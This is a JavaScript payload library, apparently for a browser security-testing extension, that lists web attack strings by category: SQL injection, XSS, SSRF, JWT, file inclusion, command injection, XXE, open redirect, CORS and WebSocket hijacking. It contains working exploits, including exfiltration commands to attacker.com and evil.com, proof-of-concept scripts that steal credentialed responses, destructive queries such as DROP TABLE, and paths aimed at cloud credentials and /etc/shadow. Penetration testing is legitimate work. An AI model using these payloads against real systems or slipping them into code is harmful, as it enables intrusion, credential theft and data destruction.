// =============================================================================
// ADVERSARIAL PAYLOAD LIBRARY
// Organized payload generators for ethical security testing
// =============================================================================

const AdversarialPayloads = {

    // ── SQL INJECTION PAYLOADS ──
    sqli: {
        categories: {
            errorBased: "Error-Based SQLi",
            unionBased: "Union-Based SQLi",
            booleanBlind: "Boolean-Based Blind SQLi",
            timeBlind: "Time-Based Blind SQLi",
            noComment: "No-Comment SQLi",
            stacked: "Stacked Queries"
        },

        errorBased: [
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR '1'='1",
            "') OR ('1'='1",
            "' OR 1=1 #",
            "\" OR 1=1 #",
            "' OR 'x'='x",
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' WAITFOR DELAY '0:0:5'--",
            "1 WAITFOR DELAY '0:0:5'--",
            "' OR SLEEP(5)--",
            "1 OR SLEEP(5)--",
            "' AND SLEEP(5)--",
            "1 AND SLEEP(5)--",
            "' OR pg_sleep(5)--",
            "1 OR pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT user()--",
            "' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables--",
            "\" AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables--"
        ],

        timeBlind: [
            "1' AND SLEEP(5) AND '1'='1",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
            "' OR SLEEP(5) OR '",
            "' WAITFOR DELAY '00:00:05'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1); WAITFOR DELAY '00:00:05'--",
            "' AND BENCHMARK(5000000, MD5('test'))--",
            "1 AND BENCHMARK(5000000, MD5('test'))--",
            "' AND pg_sleep(5)--",
            "1; SELECT pg_sleep(5)--"
        ],

        booleanBlind: [
            "' AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "' OR '1'<'1",
            "' OR '1'<'2",
            "admin' AND '1'='1",
            "admin' AND '1'='2"
        ],

        unionBased: [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "\" UNION SELECT 1,2,3--",
            "' UNION SELECT @@version,2,3--",
            "' UNION SELECT database(),2,3--",
            "' UNION SELECT user(),2,3--",
            "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--"
        ],

        stacked: [
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked' WHERE id=1--",
            "1'; DELETE FROM logs WHERE '1'='1",
            "'; EXEC xp_cmdshell('whoami')--"
        ],

        noComment: [
            "' OR '1'='1",
            "' OR 1='1",
            "' UNION SELECT NULL,NULL WHERE '1'='1",
            "1 AND 1=1",
            "admin' OR '1'='1",
            "' OR 1=0 UNION SELECT 1,2,3 WHERE '1'='1"
        ],

        generatePayloads: function (params, dbms = 'auto') {
            let payloads = [];
            // If URL params exist, generate targeted payloads
            if (params && params.length > 0) {
                for (const param of params) {
                    for (const p of this.errorBased.slice(0, 5)) {
                        payloads.push({ param, payload: `${param}=${encodeURIComponent(p)}`, type: 'errorBased' });
                    }
                    for (const p of this.timeBlind.slice(0, 3)) {
                        payloads.push({ param, payload: `${param}=${encodeURIComponent(p)}`, type: 'timeBlind' });
                    }
                }
            } else {
                // Generic if no params identified
                payloads = this.errorBased.slice(0, 10).map(p => ({ payload: p, type: 'errorBased' }));
            }
            return payloads;
        }
    },

    // ── XSS PAYLOADS ──
    xss: {
        categories: {
            basic: "Basic XSS",
            bypass: "WAF Bypass",
            polyglot: "Polyglot XSS",
            dom: "DOM-based XSS",
            svg: "SVG XSS",
            storage: "Storage/Stored XSS",
            angular: "Angular Template Injection",
            prototype: "Prototype Pollution XSS"
        },

        basic: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "><img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "`-alert(1)-`",
            "<details open ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>"
        ],

        bypass: [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=x onerror=alert(1)>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
            "<img src=x onerror=\u0061\u006C\u0065\u0072\u0074(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            "jav\tascript:alert(1)",
            "jav&#x09;ascript:alert(1)",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<iframe src=\"javascript:alert(1)\">",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>"
        ],

        polyglot: [
            "\" onclick=alert(1)//<img src=x onerror=alert(1)><svg/onload=alert(1)>",
            "\" autofocus onfocus=alert(1)//\"'><img src=x onerror=alert(1)>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>",
            "\"'>\"'><img src=x onerror=alert(1)></svg>",
            "<svg/onload=alert(1)><img src=x onerror=alert(1) onmouseover=alert(1)>"
        ],

        dom: [
            "#<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "//\nalert(1)//",
            "\\\"-alert(1)-//",
            "javascript:alert(document.cookie)",
            "#<svg/onload=alert(1)>",
            "-alert(1)-"
        ],

        svg: [
            "<svg onload=alert(1)>",
            "<svg onload=\"alert(1)\" xmlns=\"http://www.w3.org/2000/svg\">",
            "<svg><desc><img src=x onerror=alert(1)></desc></svg>",
            "<svg><animate onbegin=alert(1)>",
            "<svg><set onbegin=alert(1) attributeName=x>",
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\"><rect width=\"100\" height=\"100\"/></a></svg>"
        ],

        angular: [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{a='constructor';b='a';c='constructor';d='alert(1)';e='))()';eval(a+b+c+d+e)}}",
            "{{_=0x6c656e677468;toString.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}"
        ],

        prototype: [
            '{"__proto__":{"polluted":"true"}}',
            '{"constructor":{"prototype":{"polluted":"true"}}}',
            'Object.prototype.pollution = "test"',
            '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
        ],

        generatePayloads: function (context = 'html') {
            const map = {
                html: this.basic,
                reflected: this.bypass,
                dom: this.dom,
                svg: this.svg,
                angular: this.angular
            };
            const base = map[context] || this.basic;
            return base.map(p => ({ payload: p, type: context }));
        }
    },

    // ── SSRF PAYLOADS ──
    ssrf: {
        categories: {
            cloudMetadata: "Cloud Metadata Endpoints",
            internalPorts: "Internal Port Scan",
            protocolSmuggling: "Protocol Smuggling",
            fileRead: "File Read via SSRF"
        },

        cloudMetadata: [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/hostname",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://100.100.100.200/latest/meta-data/",
            "http://169.254.169.254/2009-04-04/meta-data/",
            "https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=test"
        ],

        internalPorts: [
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8443",
            "http://127.0.0.1:3000",
            "http://127.0.0.1:5000",
            "http://127.0.0.1:9200",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:27017",
            "http://127.0.0.1:11211",
            "http://127.0.0.1:5555",
            "http://127.0.0.1:9000",
            "http://127.0.0.1:8081",
            "http://127.0.0.1:8000",
            "http://127.0.0.1:9090",
            "http://127.0.0.1:7070",
            "http://localhost:80",
            "http://localhost:443",
            "http://localhost:8080",
            "http://[::1]:80",
            "http://[::1]:8080",
            "http://0.0.0.0:80",
            "http://0.0.0.0:8080",
            "http://0.0.0.0:9200"
        ],

        protocolSmuggling: [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
            "dict://127.0.0.1:6379/info",
            "ftp://127.0.0.1:21",
            "gopher://127.0.0.1:3306/_",
            "file:///c:/windows/win.ini",
            "file:///c:/boot.ini"
        ],

        fileRead: [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/fd/0",
            "file:///proc/net/fib_trie",
            "file:///var/www/html/index.php",
            "file:///var/www/html/config.php",
            "file:///etc/nginx/nginx.conf",
            "file:///etc/apache2/apache2.conf",
            "file:///etc/httpd/conf/httpd.conf",
            "file:///c:/windows/system32/drivers/etc/hosts",
            "file:///c:/windows/repair/sam"
        ]
    },

    // ── JWT ATTACK PAYLOADS ──
    jwt: {
        categories: {
            noneAlg: "'none' Algorithm Attack",
            hmacConfusion: "HMAC/RS Confusion",
            kidInjection: "kid Header Injection",
            jkuSpoof: "JKU Header Spoofing",
            weakSecret: "Weak Secret Bruteforce"
        },

        noneAlg: [
            '{"alg":"none","typ":"JWT"}',
            '{"alg":"None","typ":"JWT"}',
            '{"alg":"NONE","typ":"JWT"}',
            '{"alg":"none","typ":"JWT","kid":"../../../../../../dev/null"}',
            '{"alg":"none","typ":"JWT","b64":false}'
        ],

        hmacConfusion: [
            '{"alg":"HS256","typ":"JWT"}',
            '{"alg":"HS384","typ":"JWT"}',
            '{"alg":"HS512","typ":"JWT"}',
            '{"alg":"HS256","typ":"JWT","kid":"test"}',
            '{"alg":"HS256","typ":"JWT","kid":"../../../etc/passwd"}'
        ],

        kidInjection: [
            '{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}',
            '{"alg":"HS256","typ":"JWT","kid":"/proc/sys/kernel/random/uuid"}',
            '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}',
            '{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}',
            '{"alg":"HS256","typ":"JWT","kid":"file:///etc/passwd"}'
        ],

        jkuSpoof: [
            '{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}',
            '{"alg":"RS256","typ":"JWT","jku":"http://169.254.169.254/jwks.json"}',
            '{"alg":"RS256","typ":"JWT","jku":"file:///etc/passwd"}'
        ],

        weakSecrets: [
            "secret", "password", "123456", "admin", "token",
            "jwt_secret", "mySecret", "changethis", "s3cr3t",
            "passw0rd", "th1s1ss3cr3t", "qwerty", "letmein"
        ],

        generatePayload: function (header = 'none', payload = '{"sub":"admin","role":"admin"}') {
            const h = this.noneAlg[0];
            const encoded = btoa(header) + '.' + btoa(payload) + '.';
            return { header, payload, token: encoded + 'signature' };
        }
    },

    // ── LOCAL/REMOTE FILE INCLUSION ──
    lfi: {
        categories: {
            basic: "Basic LFI",
            wrappers: "PHP Wrappers",
            nullByte: "Null Byte Injection",
            doubleEncoding: "Double Encoding",
            logPoison: "Log Poisoning Paths"
        },

        basic: [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\boot.ini",
            "....//....//....//etc/passwd",
            "../etc/passwd%00",
            "../../etc/passwd%00",
            "../../../etc/passwd%00"
        ],

        wrappers: [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=/var/www/html/config.php",
            "php://filter/convert.base64-encode/resource=../admin/config.php",
            "php://input",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2BCg=="
        ],

        doubleEncoding: [
            "%252e%252e%252fetc%252fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        ],

        logPoison: [
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/httpd/access_log",
            "/var/log/httpd/error_log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/apache/access.log",
            "/proc/self/environ",
            "/var/log/lastlog",
            "/var/log/auth.log",
            "/var/log/messages"
        ]
    },

    // ── COMMAND INJECTION ──
    cmdInjection: {
        categories: {
            basic: "Basic Command Injection",
            blind: "Blind Command Injection",
            outOfBand: "Out-of-Band (OOB)",
            obfuscated: "Obfuscated Commands"
        },

        basic: [
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
            "&& id",
            "|| id",
            "'; whoami;'",
            "'; id;'",
            "\"; whoami;\"",
            "\"; id;\"",
            "| cat /etc/passwd",
            "| dir",
            "| type C:\\windows\\win.ini"
        ],

        blind: [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "& ping 127.0.0.1 &",
            "; timeout 5",
            "| timeout 5"
        ],

        outOfBand: [
            "; curl http://attacker.com/$(whoami)",
            "| curl http://attacker.com/$(id)",
            "; nslookup $(hostname).attacker.com",
            "| nslookup $(whoami).attacker.com",
            "; wget --post-data=\"flag=$(cat /etc/passwd | base64)\" http://attacker.com/",
            "| powershell Invoke-WebRequest -Uri http://attacker.com/ -Method POST -Body (Get-Content /etc/passwd)"
        ],

        obfuscated: [
            "; $(echo 'd2hvYW1p') | base64 -d | sh",
            "| $(echo 'aWQ=') | base64 -d | sh",
            "; /bin/cat /etc/passwd",
            "; /usr/bin/id",
            "| /usr/bin/whoami",
            "; c\"\"at /etc/passwd",
            "; c'a't /etc/passwd"
        ]
    },

    // ── XXE PAYLOADS ──
    xxe: {
        categories: {
            fileRead: "XXE File Read",
            ssrf: "XXE to SSRF",
            blind: "Blind XXE (OOB)",
            dos: "XXE DoS (Billion Laughs)"
        },

        fileRead: [
            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`,

            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>`
        ],

        ssrf: [
            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>`,

            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080">
]>
<root>&xxe;</root>`
        ],

        blind: [
            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.dnslog.cn/xxe.dtd">
  %xxe;
]>
<root>test</root>`,

            `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
  %send;
]>
<root>test</root>`
        ],

        dos: [
            `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;">
]>
<root>&lol7;</root>`
        ]
    },

    // ── OPEN REDIRECT ──
    openRedirect: {
        categories: {
            basic: "Basic Open Redirect",
            bypass: "Open Redirect Bypass",
            protocolRelative: "Protocol-Relative Redirect",
            crlf: "CRLF Injection"
        },

        basic: [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "http://evil.com/phishing",
            "https://evil.com/malware"
        ],

        bypass: [
            "http://evil.com?redirect=valid.com",
            "http://valid.com@evil.com",
            "http://valid.com.evil.com",
            "http://evil.com%2Fvalid.com",
            "http://valid.com%40evil.com",
            "http://evil.com:valid.com",
            "http://valid.com%2eevil.com",
            "http://valid.com//evil.com",
            "http://valid.com\\@evil.com",
            "http://evil.com\\%00valid.com",
            "http://valid.com/..%2fevil.com"
        ],

        protocolRelative: [
            "//evil.com",
            "///evil.com",
            "////evil.com",
            "//evil.com%2F%2Fvalid.com",
            "//evil.com/valid.com"
        ],

        crlf: [
            "http://valid.com%0d%0aLocation:%20http://evil.com",
            "http://valid.com%0aLocation:%20http://evil.com",
            "http://valid.com%0d%0aSet-Cookie:%20session=hacked",
            "/logout%0d%0aLocation:%20http://evil.com%0d%0a"
        ]
    },

    // ── CORS EXPLOIT ──
    cors: {
        categories: {
            originReflection: "Origin Reflection",
            nullOrigin: "Null Origin Bypass",
            wildcard: "Wildcard CORS",
            preflightBypass: "Preflight Bypass"
        },

        originReflection: [
            "Origin: https://evil.com",
            "Origin: http://evil.com",
            "Origin: https://evil.com:8080",
            "Origin: https://sub.evil.com"
        ],

        nullOrigin: [
            "Origin: null",
            "Origin: data://",
            "Origin: file://",
            "sandboxed iframe"
        ],

        preflightPayload: `fetch('{TARGET}', {
  method: 'POST',
  mode: 'cors',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/xml',
    'X-Custom-Header': 'test'
  },
  body: 'test'
}).then(r => r.text()).then(console.log)`,

        javascriptPoc: `var req = new XMLHttpRequest();
req.onload = function() {
  // Exfiltrate response to attacker
  new Image().src = 'https://evil.com/steal?data=' + btoa(this.responseText);
};
req.open('GET', '{TARGET}', true);
req.withCredentials = true;
req.send();`
    },

    // ── WEBSOCKET HIJACK ──
    websocket: {
        categories: {
            noAuth: "WebSocket without Auth",
            csrf: "Cross-Site WebSocket Hijack",
            injection: "WebSocket Message Injection"
        },

        csrfPayload: `var ws = new WebSocket('ws://{TARGET}');
ws.onopen = function() {
  ws.send('test');
};
ws.onmessage = function(e) {
  new Image().src = 'https://evil.com/ws?data=' + btoa(e.data);
};`,

        injection: [
            '{"type":"auth","token":"","user":"admin"}',
            '{"command":"whoami"}',
            '{"action":"exec","cmd":"id"}',
            '<script>alert(1)</script>',
            '../../etc/passwd',
            '{"__proto__":{"admin":true}}'
        ]
    },

    // ── WEB CACHE POISONING ──
    cachePoisoning: {
        categories: {
            unkeyedHeaders: "Unkeyed Header Injection",
            parameterCloaking: "Parameter Cloaking",
            pathConfusion: "Path Confusion"
        },

        unkeyedHeaders: [
            "X-Forwarded-Host: evil.com",
            "X-Forwarded-Scheme: http",
            "X-Forwarded-Proto: http",
            "X-Real-IP: 127.0.0.1",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-HTTP-Method-Override: POST",
            "X-Forwarded-Port: 80",
            "X-Originating-IP: 127.0.0.1"
        ],

        poisonPaths: [
            "/test.css?",
            "/test.js?",
            "/static/style.css?",
            "/version?",
            "/api/health?"
        ]
    }
};

// Exportar para uso en la extensión
if (typeof module !== 'undefined' && module.exports) {
    module.exports = AdversarialPayloads;
}